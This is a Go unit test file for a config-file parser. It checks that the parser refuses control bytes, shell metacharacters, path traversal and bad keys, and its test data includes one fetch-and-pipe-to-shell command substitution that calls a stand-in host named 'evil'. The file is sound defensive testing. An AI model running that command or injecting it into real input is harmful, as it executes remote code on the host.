package conf

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Inventory — tests/unit/config_parse.bats:
// PORTED: tests/unit/config_parse.bats: "a command substitution never executes and is refused" -> TestValueMetacharactersRefused
// PORTED: tests/unit/config_parse.bats: "a backtick substitution never executes and is refused" -> TestValueMetacharactersRefused
// PORTED: tests/unit/config_parse.bats: "a NUL byte is detected — which a variable-based check cannot do" -> TestByteGate
// PORTED: tests/unit/config_parse.bats: "CR, TAB and other control bytes are refused" -> TestByteGate
// PORTED: tests/unit/config_parse.bats: "a plain KEY=value file parses to tab-delimited records" -> TestScanPlainFile
// PORTED: tests/unit/config_parse.bats: "a value keeps its = signs — only the FIRST separates" -> TestScanPlainFile
// PORTED: tests/unit/config_parse.bats: "a non-ASCII value is accepted — refusing UTF-8 would break real home directories" -> TestScanPlainFile
// PORTED: tests/unit/config_parse.bats: "shell metacharacters in a value are refused" -> TestValueMetacharactersRefused
// PORTED: tests/unit/config_parse.bats: "a key outside the MYTHICAL_ namespace is refused" -> TestKeyGrammar
// PORTED: tests/unit/config_parse.bats: "a lowercase or punctuated key is refused" -> TestKeyGrammar
// PORTED: tests/unit/config_parse.bats: "a line with no = is refused rather than skipped" -> TestScanRefusals
// PORTED: tests/unit/config_parse.bats: "the key-count cap is exact: 1024 keys accepted, 1025 refused" -> TestKeyCountCapExact
// N/A: tests/unit/config_parse.bats: "a file far over the key cap is refused quickly, not after a quadratic scan" -- the Go scan is linear (map-based dedup); there is no quadratic to bound, and the cap itself is TestKeyCountCapExact
// PORTED: tests/unit/config_parse.bats: "a duplicate key is refused as ambiguous" -> TestScanRefusals
// PORTED: tests/unit/config_parse.bats: "a file without a trailing newline is refused as truncated" -> TestScanRefusals
// PORTED: tests/unit/config_parse.bats: "leading or trailing space in a value is refused" -> TestValueSpaceRules
// PORTED: tests/unit/config_parse.bats: "an interior space is accepted — bind paths contain them" -> TestValueSpaceRules
// PORTED: tests/unit/config_parse.bats: "an empty value is accepted" -> TestScanPlainFile
// PORTED: tests/unit/config_parse.bats: "an empty file parses to nothing, successfully" -> TestScanPlainFile
// N/A: tests/unit/config_parse.bats: "the public readers refuse bad arity instead of aborting under set -u" -- Go signatures fix arity at compile time; there is no set -u to abort under
// PORTED: tests/unit/config_parse.bats: "an unreadable file is reported as unreadable, not as containing control bytes" -> TestUnreadableVsHostile
// PORTED: tests/unit/config_parse.bats: "a missing file reports rc 3, distinct from malformed" -> TestMissingIsDistinct
//
// Inventory — tests/unit/config_spec.bats:
// PORTED: tests/unit/config_spec.bats: "typed length caps are BYTES, and do not vary with the locale" -> TestCapsAreBytes
// PORTED: tests/unit/config_spec.bats: "an unknown key is REJECTED, not ignored" -> TestValidateUnknownKeyRejects
// PORTED: tests/unit/config_spec.bats: "a valid file emits validated records" -> TestLoadFamilyValid
// PORTED: tests/unit/config_spec.bats: "str rejects an over-length value" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "int rejects out-of-range, non-numeric, and empty" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "int accepts the inclusive bounds" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "int does not overflow on an absurdly long number" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "int rejects a leading zero — [ -ge ] would re-read it as octal" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "a glob metacharacter in a value does not match an enum member" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "a value containing the enum delimiter is rejected" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "enum accepts only listed values, and is not a substring match" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "bool accepts exactly true and false" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "path requires absolute and refuses a .. component" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "netname refuses host and container: modes" -> TestTypeOK
// PORTED: tests/unit/config_spec.bats: "a valid record followed by an invalid one emits nothing at all" -> TestValidateAllOrNothing
// PORTED: tests/unit/config_spec.bats: "a malformed file fails validation without reaching the spec" -> TestScanFailurePrecedesSpec
// PORTED: tests/unit/config_spec.bats: "a missing file reports rc 3" -> TestMissingIsDistinct
// PORTED: tests/unit/config_spec.bats: "an absent key in a present file is not an error — defaults are the caller's business" -> TestLoadFamilyValid
// PORTED: tests/unit/config_spec.bats: "mi_conf_get returns one value, rc 3 when absent" -> TestGet
// PORTED: tests/unit/config_spec.bats: "mi_conf_get propagates a parse failure instead of reporting absent" -> TestGet

func writeFile(t *testing.T, dir, name, content string) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestByteGate(t *testing.T) {
	if err := DataBytesOK([]byte("MYTHICAL_A=x\x00y\n")); !errors.Is(err, ErrControlBytes) {
		t.Fatal("NUL escaped the byte gate")
	}
	for _, b := range []string{"\r", "\t", "\x0b", "\x7f"} {
		if err := DataBytesOK([]byte("MYTHICAL_A=x" + b + "\n")); !errors.Is(err, ErrControlBytes) {
			t.Fatalf("control byte %q escaped the gate", b)
		}
	}
	if err := DataBytesOK([]byte("MYTHICAL_A=clean\n")); err != nil {
		t.Fatal(err)
	}
}

func TestValueMetacharactersRefused(t *testing.T) {
	// Nothing here can EXECUTE a substitution — there is no shell — but the refusal is still
	// the contract: these values never load, so no consumer can hand them to one either.
	for _, v := range []string{"$(curl evil|sh)", "`id`", "back\\slash", "has$dollar"} {
		if ValueOK(v) {
			t.Fatalf("ValueOK(%q) = true", v)
		}
	}
}

func TestValueSpaceRules(t *testing.T) {
	if ValueOK(" leading") || ValueOK("trailing ") {
		t.Fatal("edge space accepted")
	}
	if !ValueOK("/Users/o p/dir") {
		t.Fatal("interior space refused — bind paths contain them")
	}
}

func TestKeyGrammar(t *testing.T) {
	for _, k := range []string{"PATH", "MYTHICAL_", "mythical_a", "MYTHICAL_a", "MYTHICAL_A!B"} {
		if KeyOK(k) {
			t.Fatalf("KeyOK(%q) = true", k)
		}
	}
	if !KeyOK("MYTHICAL_NET") || !KeyOK("MYTHICAL_BROKKR_DATA_BIND") {
		t.Fatal("legal keys refused")
	}
}

func TestScanPlainFile(t *testing.T) {
	kvs, err := ScanData([]byte("# comment\n\nMYTHICAL_A=one\nMYTHICAL_B=a=b=c\nMYTHICAL_C=José\nMYTHICAL_D=\n"), "t")
	if err != nil {
		t.Fatal(err)
	}
	want := []KV{{"MYTHICAL_A", "one"}, {"MYTHICAL_B", "a=b=c"}, {"MYTHICAL_C", "José"}, {"MYTHICAL_D", ""}}
	if len(kvs) != len(want) {
		t.Fatalf("got %v", kvs)
	}
	for i := range want {
		if kvs[i] != want[i] {
			t.Fatalf("record %d = %v, want %v", i, kvs[i], want[i])
		}
	}
	// The empty file parses to nothing, successfully.
	if kvs, err := ScanData(nil, "t"); err != nil || len(kvs) != 0 {
		t.Fatalf("empty: %v, %v", kvs, err)
	}
}

func TestScanRefusals(t *testing.T) {
	cases := map[string]string{
		"no assignment":  "not an assignment\n",
		"duplicate":      "MYTHICAL_A=1\nMYTHICAL_A=2\n",
		"marker in body": MarkerPrefix + "abc\nMYTHICAL_A=1\n",
	}
	for name, body := range cases {
		if _, err := ScanData([]byte(body), "t"); err == nil {
			t.Fatalf("%s accepted", name)
		}
	}
	dir := t.TempDir()
	p := writeFile(t, dir, "c.conf", "MYTHICAL_A=1") // no trailing newline
	if _, err := ScanFile(p); err == nil || !strings.Contains(err.Error(), "truncated") {
		t.Fatalf("unterminated file: %v", err)
	}
}

func TestKeyCountCapExact(t *testing.T) {
	var b strings.Builder
	for i := 0; i < MaxKeys; i++ {
		b.WriteString("MYTHICAL_K")
		for _, d := range []byte{byte('A' + i/26/26%26), byte('A' + i/26%26), byte('A' + i%26)} {
			b.WriteByte(d)
		}
		b.WriteString("=v\n")
	}
	if _, err := ScanData([]byte(b.String()), "t"); err != nil {
		t.Fatalf("exactly %d keys refused: %v", MaxKeys, err)
	}
	b.WriteString("MYTHICAL_ONEMORE=v\n")
	if _, err := ScanData([]byte(b.String()), "t"); err == nil {
		t.Fatalf("%d keys accepted", MaxKeys+1)
	}
}

func TestUnreadableVsHostile(t *testing.T) {
	dir := t.TempDir()
	p := writeFile(t, dir, "c.conf", "MYTHICAL_A=1\n")
	if err := os.Chmod(p, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(p, 0o600) })
	if os.Getuid() == 0 {
		t.Skip("root reads through 0000")
	}
	_, err := ScanFile(p)
	if !errors.Is(err, ErrUnreadable) {
		t.Fatalf("want unreadable, got %v", err)
	}
	if errors.Is(err, ErrControlBytes) {
		t.Fatal("a permission problem reported as hostile content")
	}
}

func TestMissingIsDistinct(t *testing.T) {
	_, err := ScanFile(filepath.Join(t.TempDir(), "absent.conf"))
	if !errors.Is(err, ErrMissing) {
		t.Fatalf("want ErrMissing, got %v", err)
	}
	_, err = LoadFamily(t.TempDir(), FamilySpec())
	if !errors.Is(err, ErrMissing) {
		t.Fatalf("LoadFamily on empty home: want ErrMissing, got %v", err)
	}
}

func TestCapsAreBytes(t *testing.T) {
	// 8 characters, 16 bytes: the bash measured this exact value validating differently per
	// locale and pinned BYTES. Go len() is bytes; the assertion keeps it that way.
	v := strings.Repeat("é", 8)
	if TypeOK("str:8", v) {
		t.Fatalf("str:8 accepted %d bytes", len(v))
	}
	if !TypeOK("str:16", v) {
		t.Fatal("str:16 refused 16 bytes")
	}
}

func TestTypeOK(t *testing.T) {
	cases := []struct {
		typ, v string
		want   bool
	}{
		{"str:8", "12345678", true},
		{"str:8", "123456789", false},
		{"int:1:100", "0", false},
		{"int:1:100", "1", true},
		{"int:1:100", "100", true},
		{"int:1:100", "101", false},
		{"int:1:100", "", false},
		{"int:1:100", "12a", false},
		{"int:1:100", "-5", false},
		{"int:1:100", "+5", false},
		{"int:1:100", " 5", false},
		{"int:1:100", "010", false}, // octal re-read hazard, pinned
		{"int:0:9", "0", true},
		{"int:1:100", strings.Repeat("9", 30), false}, // no overflow wrap
		{"bool", "true", true},
		{"bool", "false", true},
		{"bool", "True", false},
		{"bool", "1", false},
		{"enum:red|green", "red", true},
		{"enum:red|green", "re", false},
		{"enum:red|green", "green|", false},
		{"enum:red|green", "red|green", false}, // delimiter forgery, pinned
		{"enum:red|green", "*", false},         // glob metacharacter is inert
		{"enum:red|green", "", false},
		{"path:64", "/srv/data", true},
		{"path:64", "relative", false},
		{"path:64", "/srv/../etc", false},
		{"path:64", "/srv/..hidden", true}, // component rule, not substring
		{"path:4", "/too-long", false},
		{"netname", "mythical-net", true},
		{"netname", "host", false},
		{"netname", "none", false},
		{"netname", "container:other", false},
		{"netname", "-leading", false},
		{"netname", "a" + strings.Repeat("b", 128), false},
		{"mystery:5", "x", false}, // unknown spec type validates nothing
	}
	for _, c := range cases {
		if got := TypeOK(c.typ, c.v); got != c.want {
			t.Errorf("TypeOK(%q, %q) = %v, want %v", c.typ, c.v, got, c.want)
		}
	}
}

func TestValidateUnknownKeyRejects(t *testing.T) {
	_, err := Validate([]KV{{"MYTHICAL_SURPRISE", "x"}}, "t", FamilySpec())
	if err == nil || !strings.Contains(err.Error(), "unknown key") {
		t.Fatalf("unknown key: %v", err)
	}
}

func TestValidateAllOrNothing(t *testing.T) {
	got, err := Validate([]KV{
		{"MYTHICAL_NET", "goodnet"},
		{"MYTHICAL_TELEMETRY_KEY", strings.Repeat("x", 600)}, // over str:512
	}, "t", FamilySpec())
	if err == nil {
		t.Fatal("invalid record accepted")
	}
	if got != nil {
		t.Fatalf("a rejected file leaked records: %v", got)
	}
}

func TestScanFailurePrecedesSpec(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "mythical.conf", "garbage line\n")
	_, err := LoadFamily(dir, FamilySpec())
	if err == nil || !strings.Contains(err.Error(), "not a KEY=value") {
		t.Fatalf("malformed file must fail at the scan, before any spec: %v", err)
	}
}

func TestLoadFamilyValid(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "mythical.conf", "MYTHICAL_NET=mythical-net\n")
	got, err := LoadFamily(dir, FamilySpec())
	if err != nil {
		t.Fatal(err)
	}
	if got["MYTHICAL_NET"] != "mythical-net" {
		t.Fatalf("got %v", got)
	}
	// An absent key in a present file is not an error — defaults are the caller's business.
	if _, ok := got["MYTHICAL_TELEMETRY_KEY"]; ok {
		t.Fatal("absent key materialised")
	}
}

func TestGet(t *testing.T) {
	dir := t.TempDir()
	p := writeFile(t, dir, "mythical.conf", "MYTHICAL_NET=n1\n")
	v, err := Get(p, "MYTHICAL_NET")
	if err != nil || v != "n1" {
		t.Fatalf("%q, %v", v, err)
	}
	_, err = Get(p, "MYTHICAL_TELEMETRY_KEY")
	if !errors.Is(err, ErrAbsent) {
		t.Fatalf("want ErrAbsent, got %v", err)
	}
	// A parse failure propagates — it must never masquerade as absent.
	bad := writeFile(t, dir, "bad.conf", "garbage\n")
	_, err = Get(bad, "MYTHICAL_NET")
	if err == nil || errors.Is(err, ErrAbsent) {
		t.Fatalf("parse failure reported as absent: %v", err)
	}
}

func TestBindKeyShape(t *testing.T) {
	typ, ok := BindKeyType("MYTHICAL_BROKKR_DATA_BIND")
	if !ok || typ != "path:4096" {
		t.Fatalf("bind shape: %q, %v", typ, ok)
	}
	// Refusals, including the both-halves rule: a mid with no '_' (product alone, e.g.
	// MYTHICAL_BROKKR_BIND) is not the shape.
	for _, k := range []string{"MYTHICAL_NET", "MYTHICAL_BIND", "MYTHICAL_BROKKR_BIND", "MYTHICAL_a_b_BIND"} {
		if _, ok := BindKeyType(k); ok {
			t.Errorf("BindKeyType(%q) accepted", k)
		}
	}
}
